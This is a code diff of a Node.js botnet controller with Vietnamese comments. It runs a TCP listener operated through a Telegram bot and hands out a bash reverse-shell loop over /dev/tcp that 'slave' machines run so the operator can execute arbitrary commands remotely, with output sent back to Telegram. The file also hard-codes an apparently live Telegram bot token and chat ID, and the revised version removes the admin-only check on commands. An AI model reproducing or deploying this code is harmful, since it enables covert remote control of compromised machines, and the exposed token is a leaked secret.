@@ -1,17 +1,27 @@
 const net = require('net');
 const TelegramBot = require('node-telegram-bot-api');
+const { execSync } = require('child_process');
 
-const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
-const chatIdAdmin = 7371969470;
+// === Cấu hình ===
+const TELEGRAM_BOT_TOKEN = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
+const TELEGRAM_CHAT_ID = '7371969470';
+const PORT = 7777;
 
-const bot = new TelegramBot(token, { polling: true });
-const clients = new Map(); // socket => {ip, port}
+// === Khởi tạo bot Telegram ===
+const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
 
-function sendSlaveCommand() {
-  // Lệnh slave gọn dùng curl lấy IP public rồi connect
-  const slaveCmd = 
-`while true; do
-  exec 3<>/dev/tcp/$(curl -s https://api.ipify.org)/7777
+// === Danh sách các bot slave đang kết nối ===
+let clients = [];
+
+// === Hàm gửi kết quả về Telegram ===
+function sendToTelegram(message) {
+  bot.sendMessage(TELEGRAM_CHAT_ID, message);
+}
+
+// === Hàm tạo lệnh dành cho slave ===
+function generateSlaveCommand(ip) {
+  return `while true; do
+  exec 3<>/dev/tcp/${ip}/${PORT}
   while read -r cmd <&3; do
     [[ -z "$cmd" ]] && continue
     output=$(bash -c "$cmd" 2>&1)
@@ -19,62 +29,57 @@ function sendSlaveCommand() {
   done
   sleep 2
 done`;
-
-  bot.sendMessage(chatIdAdmin, `🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave để kết nối:\n\`\`\`bash\n${slaveCmd}\n\`\`\``, { parse_mode: 'Markdown' });
 }
 
-const server = net.createServer(socket => {
-  const ip = socket.remoteAddress;
-  const port = socket.remotePort;
-  clients.set(socket, { ip, port });
+// === Tạo server TCP ===
+const server = net.createServer((socket) => {
+  const address = `${socket.remoteAddress}:${socket.remotePort}`;
+  clients.push({ socket, address });
 
-  bot.sendMessage(chatIdAdmin, `[+] Bot mới kết nối: ${ip}:${port}`);
+  sendToTelegram(`🟢 Bot mới kết nối: ${address}`);
 
-  socket.on('data', data => {
-    const msg = data.toString().trim();
-    if (msg) {
-      bot.sendMessage(chatIdAdmin, `📡 [${ip}:${port}] Kết quả:\n${msg}`);
+  socket.on('data', (data) => {
+    const result = data.toString().trim();
+    if (result) {
+      sendToTelegram(`📥 Kết quả từ ${address}:\n${result}`);
     }
   });
 
   socket.on('close', () => {
-    clients.delete(socket);
-    bot.sendMessage(chatIdAdmin, `[-] Bot mất kết nối: ${ip}:${port}`);
+    clients = clients.filter(c => c.socket !== socket);
+    sendToTelegram(`🔴 Bot đã ngắt kết nối: ${address}`);
   });
 
   socket.on('error', () => {
-    clients.delete(socket);
-    bot.sendMessage(chatIdAdmin, `[-] Bot lỗi kết nối: ${ip}:${port}`);
+    clients = clients.filter(c => c.socket !== socket);
+    sendToTelegram(`🔴 Bot lỗi kết nối: ${address}`);
   });
 });
 
-server.listen(7777, () => {
-  console.log('[*] Server lắng nghe cổng 7777');
-  sendSlaveCommand();
+server.listen(PORT, async () => {
+  const ipv4 = execSync("curl -s https://api.ipify.org").toString().trim();
+  console.log(`🔥 Server sẵn sàng trên cổng ${PORT}`);
+  sendToTelegram(`🔥 Server sẵn sàng trên cổng ${PORT}\n\nCopy lệnh này chạy trên slave để kết nối:\n\`\`\`\n${generateSlaveCommand(ipv4)}\n\`\`\``);
 });
 
-bot.onText(/^\/listbot$/, msg => {
-  if (msg.chat.id !== chatIdAdmin) return;
-  if (clients.size === 0) return bot.sendMessage(chatIdAdmin, 'Không có bot nào kết nối.');
-
-  let text = `🤖 Có ${clients.size} bot đang kết nối:\n`;
-  let i = 1;
-  for (const { ip, port } of clients.values()) {
-    text += `Bot ${i} - [${ip}:${port}]\n`;
-    i++;
+// === Xử lý lệnh từ Telegram ===
+bot.onText(/^\/listbot$/, () => {
+  if (clients.length === 0) {
+    return sendToTelegram('📛 Không có bot nào đang kết nối.');
   }
-  bot.sendMessage(chatIdAdmin, text);
+  const list = clients.map((c, i) => `Bot ${i + 1} [${c.address}]`).join('\n');
+  sendToTelegram(`📋 Danh sách ${clients.length} bot đang kết nối:\n${list}`);
 });
 
-bot.onText(/^\/cmd (.+)$/, (msg, match) => {
-  if (msg.chat.id !== chatIdAdmin) return;
-  const cmd = match[1].trim();
-  if (!cmd) return bot.sendMessage(chatIdAdmin, 'Nhập lệnh sau /cmd');
-
-  if (clients.size === 0) return bot.sendMessage(chatIdAdmin, 'Không có bot nào kết nối.');
-
-  for (const socket of clients.keys()) {
-    try { socket.write(cmd + '\n'); } catch {}
+bot.onText(/^\/cmd (.+)/, (_, match) => {
+  const cmd = match[1];
+  if (clients.length === 0) {
+    return sendToTelegram('📛 Không có bot nào đang kết nối để gửi lệnh.');
   }
-  bot.sendMessage(chatIdAdmin, `Đã gửi lệnh cho ${clients.size} bot:\n${cmd}`);
+  sendToTelegram(`📤 Gửi lệnh: \`${cmd}\` đến ${clients.length} bot...`);
+  clients.forEach(c => {
+    try {
+      c.socket.write(cmd + '\n');
+    } catch (e) {}
+  });
 });
